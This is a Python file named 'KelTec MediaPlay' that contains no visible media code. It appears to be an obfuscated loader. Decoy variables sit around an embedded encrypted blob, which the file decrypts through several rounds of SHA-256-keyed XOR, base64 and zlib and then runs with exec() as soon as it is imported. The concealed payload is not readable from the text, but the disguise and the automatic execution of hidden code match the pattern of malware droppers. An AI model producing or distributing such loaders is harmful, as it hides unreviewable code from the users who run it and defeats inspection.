# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 869953 ^ 211637
_lx1_1 = len("68d8c4")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-280872)
_lx3_3 = 858742 * 0
_lx4_4 = 178167 ^ 586539
_K = '9b1f37ae9f8e411cee29b6daff7d99dc44bbf3536aa8b1c87bc1548cf2d1bd88'
_M = '+4klpRHbKbQr5Q/VPk3f2WuTPH4u2tVECuIOw/res8i4yHioQJhpvSLoDIg5GNmPbccweSCPiBRc4FrGqozlnrabcaUWnG/qcOYB'
_D = 'xYwTWPGFlp2iQx6XlhqXO7Gestqu5K/y7l+yv4jOM6G8Jh/gDb+jFwnysvmdYmmjOv0rPbOjXuGZBmvhzMu1o5MRfZP88+jHnqH3I1F8qEpr+2yD8YiZyDuWoekl7nXhFGOCxfdi6cS/OFHpDUWTk3BV6SadyHnlJP2BRnDe13m/NgMRZQ8E0r66xO9EhXmW4eNszDvYUORgq90NHIu1Y4DJusdsMjA17QjklvzPKmooPDyakkufXhOwf5W65mu9nItdkWmzFq+kGlbPWUrvo+14QXT7QZlXOtZUC/o3cfPgKb34zQDZcVBSblc2rGQ3EAVadVpRbghtUR5JPcQw/dcPfyfSnf0T+3TyzTmOobHjFHbtaBpI0Pg4Q6mpG60AgPZCy57RyiAccR7rDMIpARmxqYDBUdJ7PNg+L+VvFvlCpeFm1ZSYFxveNnMLSpvGh+rDpieU9g0tyIgxLSvfO8xK0OFoAU/IbR0F8Y2RyJAiJMdbOvxYSLkC6KdosHJ24+woSp6AVJLVKR8KmHOVv4pyd4OqX+oWcFXAbNV5KGN9a6/tOr/XuPMXoSEFa8b/aK3Z2rqhDuzbTTJFhggyoFml0SzK2nxO4p93ZUmmI2pgsmBqx+uSQY5/bQbG7Cc2/kjEa67ZfbTZvU3OheTYeRrLOaytEhQUYB5eFQILRwIqrIQpDW/ocQxbpr197Q9Vk2AyFH3JJQo996cf+FQeARaggUmRaPtBtsfbcfeDnugq1B4F6DTKoEyR+2QyTxRRvV5FwrGr8F65q2cEBVJAWKZ0csvWFS74lk2zTk/MZaA4MlsY/hx4Dhi2VVuCLIqJYzVhvUV8h5aw8kkY7r66Ica5LYQHcEx5Lgdg8x22pxEGMpIU0BKMwZFuc7RnvsPth9mS8F30p5rklD0JdlB+ezFkQn8m4YpOWBq3zrpzFl54OjvpXBadD68ccGXoDla8wmF/Yobtbr66sTWUU+LPe1nTWJQeMdPPOPs74ANgYOVmjpQjIWzjAEd3TlhwA9pqqakJ56VmD4p/zGKB6a0VLZ4+n0W+BYsKBVcFoZ9WmgZVAZitfk9YDGdnsgDaYWoGU4d3dtzBqJ1756p6UItK3l1YK1iQkftzoHjOaiPDNj52SM07addJ0uIkPIURxApcmkUAEbLS1HgRAuQIbEPO2KZE8qf2xgwnqzPaVagyLRxI1tqS6i7lsAw6+15FQ+1LzusszEJEWa6XH1/XT235YdfAEmG4mwzJ8eivNMLjF26wXVmmsEA28Mr2Yejn315g9JFz0ciOBBxqW2M66vLwYYAz9Ne8EjBrMrW0yGUnGkGRzXiyd6kk2oeX1xpo4GkvbpM04h8JGRDcmAhC12gAMQ/qZmmMl7qjj5s52g6mOyjkeEPU5R7qPKNoQjKDq/2TKMSrRUnWkf76E8X3XiXCpqKaTRUfAwTgtNxSQ/8eNZExRS80rVGPx9bWg6XdJRL9wwm7QjjZGR1KNj1pg/HUaAjys3i7GHC24NcF/y6++6wsAqbYGggn3iq2XOpO5wuXbfhGKXgCfvmSQ96AmiRnKpnl+JMHHM21thPXoOwGBhpZDBbCMCkuTyhmeX/NNZp8TUJeDv9oTUPm38fVLS5zbjcMenLR7q1h8O2GoGWw++CczP2p8d0GaifMkPTwjAmQQXm23SjD3ppDS2aqqJLeKfgQAqlqw4AcovowJ6exl91cJC0zcAa0fRJ2KFoIcz2PrmcgGnuXLrQJFSk+UpbdFEgELCDkvDxHlEPYwLvwNqAJSYMmmwbn/ehe8BpmWkoWnGrARasiqswb22XrtmmYaFJqoAUWOicxPl2W+wgL9+3Rc2fBkdLHkKLeaugo'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})